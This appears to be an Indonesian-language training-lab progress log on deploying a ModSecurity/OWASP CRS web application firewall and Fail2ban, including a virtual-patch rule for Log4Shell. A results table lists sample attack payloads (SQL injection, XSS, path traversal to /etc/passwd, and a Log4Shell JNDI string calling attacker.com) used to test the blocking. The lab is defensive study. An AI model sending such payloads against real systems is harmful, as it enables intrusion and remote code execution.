# 🛡️ Progress Hari 6 — Keamanan Aplikasi (WAF & Fail2ban)
**Tanggal:** 14 Mei 2026 | **Status:** ✅ SELESAI

---

## 🎯 Tujuan Pembelajaran
- [x] Deploy dan konfigurasi Web Application Firewall (WAF)
- [x] Implementasi Virtual Patching untuk CVE kritis (Log4Shell)
- [x] Setup Fail2ban untuk auto-ban IP penyerang

---

## 🔬 Lab 6A — WAF (ModSecurity + OWASP CRS) ✅

### Setup Arsitektur

```
Internet → WAF Container (port 8081) → Backend App Container (port 80)
           [ModSecurity + 927 CRS Rules]   [nginx:alpine]
           waf-server (172.21.0.3)          backend-app (172.21.0.2)
                      └── Network: waf-lab-net ──┘
```

### Perintah Deploy

```bash
# Buat network
docker network create waf-lab-net

# Backend app
docker run -d --name backend-app --network waf-lab-net nginx:alpine

# WAF dengan ModSecurity + OWASP CRS
docker run -d --name waf-server \
  --network waf-lab-net \
  -p 8081:8080 -p 8443:8443 \
  -e PROXY_UPSTREAM=http://backend-app:80 \
  -e PORT=8080 \
  owasp/modsecurity-crs:nginx

# Fix proxy_pass (bug template rendering)
docker exec waf-server sed -i \
  's|proxy_pass http://localhost:80;|proxy_pass http://backend-app:80;|' \
  /etc/nginx/includes/proxy_backend.conf
docker exec waf-server nginx -s reload
```

---

## 🧪 Hasil Simulasi Serangan WAF

| Serangan | Payload | HTTP Code | Status |
|----------|---------|-----------|--------|
| Normal request | `GET /` | `200` | ✅ Lolos (benar) |
| SQL Injection | `?id=1' OR '1'='1` | `000` | ✅ **Connection Drop** |
| XSS | `?q=<script>alert(1)</script>` | `403` | ✅ **Blocked** |
| Path Traversal | `?file=../../../etc/passwd` | `403` | ✅ **Blocked** |
| **Log4Shell** | `X-Api-Version: ${jndi:ldap://attacker.com/a}` | **`403`** | ✅ **Virtual Patch Berhasil!** |

---

## 🔧 Virtual Patching — Log4Shell (CVE-2021-44228)

Custom rule ditambahkan ke `/etc/modsecurity.d/modsecurity-override.conf`:

```apache
# Virtual Patch: Log4Shell (CVE-2021-44228)
SecRule REQUEST_HEADERS|REQUEST_URI|ARGS \
  "@rx jndi:(ldap|ldaps|dns|rmi)" \
  "id:10003,phase:2,deny,status:403,log,msg:Log4Shell-Blocked"
```

**Pelajaran Virtual Patching:**
- Blokir exploit **tanpa perlu update source code** aplikasi
- Response darurat saat patch belum tersedia
- WAF jadi "tameng" di depan aplikasi yang vulnerable

---

## 🔬 Lab 6B — Fail2ban ✅

```bash
sudo apt install -y fail2ban

# jail.local
sudo nano /etc/fail2ban/jail.local
```

```ini
[DEFAULT]
bantime  = 3600
findtime = 600
maxretry = 3

[nginx-http-auth]
enabled  = true
port     = http,https
logpath  = /var/log/waf-nginx/error.log
maxretry = 3
bantime  = 3600

[sshd]
enabled = true
port    = ssh
logpath = /var/log/auth.log
maxretry = 3
bantime  = 3600
```

```bash
sudo service fail2ban start
sudo fail2ban-client status
# Output: Jail list: nginx-http-auth, sshd ✅
```

---

## 🛠️ Troubleshooting yang Ditemui

| Masalah | Penyebab | Solusi |
|---------|---------|--------|
| `ERR_EMPTY_RESPONSE` | WAF tidak punya backend untuk di-proxy | Buat container backend dulu, set `PROXY_UPSTREAM` |
| `502 Bad Gateway` | `proxy_pass` template render ke `localhost:80` bukan backend | `sed` fix di `/etc/nginx/includes/proxy_backend.conf` |
| Log4Shell tidak terblokir | CRS paranoia level 1 belum cover header check | Tambah custom rule di `/etc/modsecurity.d/modsecurity-override.conf` |
| Rule duplikat crash | Rule ID sama ditambah berkali-kali | Gunakan ID unik, tulis ulang file bersih |
| Fail2ban crash | `logpath` mengarah ke file yang tidak ada | Buat file log dulu via `touch` |
| `/etc/nginx/modsecurity.d/` vs `/etc/modsecurity.d/` | Dua path berbeda — nginx hanya load dari `/etc/modsecurity.d/` | Selalu edit file di path yang di-`Include` oleh `setup.conf` |

---

## 💡 Key Takeaways

| Konsep | Pelajaran |
|--------|-----------|
| **WAF sebagai Proxy** | WAF duduk di depan aplikasi, semua traffic harus lewat WAF dulu sebelum ke backend |
| **OWASP CRS** | 927 rule bawaan sudah cover SQLi, XSS, LFI, RCE, dll — tidak perlu buat dari nol |
| **Virtual Patching** | Saat patch belum bisa diterapkan, WAF bisa blokir exploit di level network |
| **ModSecurity Path** | Config yang di-load Nginx adalah yang di-`Include` oleh `setup.conf` — bukan sembarang folder |
| **Rule ID harus unik** | Duplikat ID langsung menyebabkan nginx gagal reload |
| **Fail2ban di WSL2** | `systemctl` tidak tersedia, gunakan `service`. File log harus ada sebelum monitoring dimulai |

---

## 📁 Infrastruktur Aktif Setelah Lab Ini

| Container | Port | Fungsi |
|-----------|------|--------|
| `waf-server` | 8081 (HTTP), 8443 (HTTPS) | WAF ModSecurity + OWASP CRS |
| `backend-app` | Internal only | Target app yang dilindungi WAF |

| Service WSL | Status | Jail |
|-------------|--------|------|
| `fail2ban` | ✅ Running | `nginx-http-auth`, `sshd` |
